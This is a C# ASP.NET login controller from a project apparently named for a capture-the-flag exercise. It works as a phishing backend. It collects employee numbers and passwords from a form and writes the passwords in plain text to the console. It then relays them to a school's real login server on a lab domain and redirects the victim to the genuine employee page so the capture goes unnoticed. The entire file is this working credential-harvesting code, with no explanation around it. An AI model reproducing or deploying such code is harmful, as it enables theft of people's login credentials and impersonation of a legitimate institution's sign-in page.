using System.Diagnostics;
using CTFomni.Models;
using Microsoft.AspNetCore.Mvc;

namespace CTFomni.Controllers;

[Route("login")]
public class LoginController : Controller
{
    private readonly IHttpClientFactory _httpClientFactory;

    public LoginController(IHttpClientFactory httpClientFactory)
    {
        _httpClientFactory = httpClientFactory;
    }

    [HttpPost]
    [Route("submit")]
    public async Task<IActionResult> Login([FromForm] LoginModel model)
    {
        var validationResult = ValidateLoginData(model);
        if (!validationResult.IsValid) return Redirect("~/index.html");

        SaveLoginData(model);

        var targetUrl = "http://zeroday.cegeplabs.qc.ca/school/index.php";

        var formData = new List<KeyValuePair<string, string>>();
        if (model.TypeIdentification == "EmployeNormal")
        {
            if (!string.IsNullOrEmpty(model.NoEmplEmployeNormal))
                formData.Add(new KeyValuePair<string, string>("DA", model.NoEmplEmployeNormal));
            if (!string.IsNullOrEmpty(model.PasswordEmplEmployeNormal))
                formData.Add(new KeyValuePair<string, string>("Password", model.PasswordEmplEmployeNormal));
        }
        else
        {
            return Redirect("~/index.html");
        }

        var httpClient = _httpClientFactory.CreateClient();
        var formContent = new FormUrlEncodedContent(formData);

        try
        {
            var response = await httpClient.PostAsync(targetUrl, formContent);

            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                Debug.WriteLine("Réponse du serveur : " + content);

                var redirectUrl = "http://zeroday.cegeplabs.qc.ca/school/employe.php";

                return Redirect(redirectUrl);
            }

            return Redirect("~/index.html");
        }
        catch (Exception ex)
        {
            Debug.WriteLine($"Erreur : {ex.Message}");
            return StatusCode(500, "Erreur interne du serveur");
        }
    }

    private (bool IsValid, string ErrorMessage) ValidateLoginData(LoginModel model)
    {
        if (string.IsNullOrEmpty(model.TypeIdentification))
            return (false, "Le type d'identification est requis.");

        if (model.TypeIdentification == "EmployeNormal")
        {
            if (string.IsNullOrEmpty(model.NoEmplEmployeNormal) ||
                string.IsNullOrEmpty(model.PasswordEmplEmployeNormal))
                return (false, "Le numéro d'employé et le mot de passe sont requis.");
        }
        else
        {
            return (false, "Type d'identification invalide.");
        }

        return (true, string.Empty);
    }

    private void SaveLoginData(LoginModel model)
    {
        Console.WriteLine($"Type: {model.TypeIdentification}");
        Console.WriteLine($"NoEmpl: {model.NoEmplEmployeNormal}");
        Console.WriteLine($"Password: {model.PasswordEmplEmployeNormal}");
    }
}
